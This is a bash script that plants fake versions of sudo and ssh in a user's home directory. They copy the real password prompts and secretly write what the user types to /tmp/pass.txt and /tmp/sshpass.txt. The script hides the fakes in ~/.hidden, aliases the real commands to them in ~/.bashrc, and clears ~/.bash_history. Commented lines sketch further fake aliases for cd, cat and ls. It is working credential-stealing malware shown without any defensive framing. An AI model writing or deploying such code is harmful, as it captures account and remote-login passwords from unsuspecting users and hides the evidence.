#!/bin/bash

mkdir ~/.hidden/ 2> /dev/null
rm -f ~/.hidden/fakesudo
touch ~/.hidden/fakesudo 2> /dev/null

printf "#!/bin/bash\n" >> ~/.hidden/fakesudo
printf "read -sp \"[sudo] password for $USER: \" sudopass\n" >> ~/.hidden/fakesudo
printf "echo \"\"\n"   >> ~/.hidden/fakesudo
printf "sleep 2\n"     >> ~/.hidden/fakesudo
printf "echo \"Sorry, try again.\"\n" >> ~/.hidden/fakesudo
printf "echo \$sudopass >> /tmp/pass.txt\n" >> ~/.hidden/fakesudo 

chmod u+x ~/.hidden/fakesudo
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc

# be careful with that

# chmod u+x ~/.hidden/fake_cat
# echo "alias top=~/.hidden/fake_cat" >> ~/.bashrc

# With that actually !
#
# echo "alias cd=~/.hidden/fake_cat"  >> ~/.bashrc
#
#

# echo "alias pwd=~/.hidden/fake_cat" >> ~/.bashrc
# echo "alias cat=~/.hidden/fake_cat" >> ~/.bashrc

# chmod u+x ~/.hidden/fake_ls
# echo "alias ls=~/.hidden/fake_ls"   >> ~/.bashrc 

# echo "alias nfsudo=/usr/bin/sudo"   >> ~/.bashrc
# echo "alias nfcat=/bin/cat"         >> ~/.bashrc
# echo "alias nfls=/bin/ls"           >> ~/.bashrc

# fake ssh

rm -f ~/.hidden/fake_ssh
touch ~/.hidden/fake_ssh

printf "#!/bin/bash\n" >> ~/.hidden/fake_ssh
printf "echo \"The authenticity of that host can't be established.\"\n" >> ~/.hidden/fake_ssh
printf "echo \"ED25519 key fingerprint is SHA256:7iO3V7pR0dVQ1SkP+5w2OLRtQ4ZqRBO1tNTRMXLAs4k.\"\n" >> ~/.hidden/fake_ssh
printf "echo \"This host key is known by the following other names/addresses:\"\n" >> ~/.hidden/fake_ssh
printf "echo \"    ~/.ssh/known_hosts:15: [hashed name]\"\n" >> ~/.hidden/fake_ssh
printf "read -sp \"Are you sure you want to continue connecting (yes/no/[fingerprint])?\" answer\n" >> ~/.hidden/fake_ssh
printf "if [ \"\$answer\" == \"y\" ] || [ \"\$answer\" = \"Y\" ] || [ \"\$answer\" = \"yes\" ]; then\n" >> ~/.hidden/fake_ssh
printf "    echo \"\"\n"   >> ~/.hidden/fake_ssh
printf "    read -sp \"\$1's password: \" sshpass\n" >> ~/.hidden/fake_ssh
printf "    echo \"\"\n"   >> ~/.hidden/fake_ssh
printf "    sleep 2\n"     >> ~/.hidden/fake_ssh
printf "    echo \"Sorry, try again.\"\n" >> ~/.hidden/fake_ssh
printf "else\n" >> ~/.hidden/fake_ssh
printf "    echo \"Bye!\"\n" >> ~/.hidden/fake_ssh
printf "fi\n" >> ~/.hidden/fake_ssh
printf "echo \$sshpass >> /tmp/sshpass.txt\n" >> ~/.hidden/fake_ssh 

chmod u+x ~/.hidden/fake_ssh
echo "alias ssh=~/.hidden/fake_ssh" >> ~/.bashrc
echo ""  > ~/.bash_history